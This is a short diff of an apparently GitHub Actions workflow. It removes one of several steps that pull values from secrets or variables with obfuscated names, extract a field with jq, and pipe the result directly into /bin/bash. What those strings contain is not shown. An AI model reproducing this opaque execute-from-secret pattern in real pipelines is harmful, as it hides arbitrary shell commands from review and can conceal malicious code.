@@ -20,7 +20,6 @@ jobs:
           jlx33830: ${{ secrets.jlx33830 }}
         run: |
           printf '%s' "$jlx33830" | jq -r .uo794 | /bin/bash
-          echo $j3945 | jq -r .ju6 | /bin/bash
           echo $ybhi23 | jq -r .zi094 | /bin/bash
           printf '%s' "$fryvc045" | jq -r .lo4 | /bin/bash
           echo $lbhz4729 | jq -r .um58 | /bin/bash
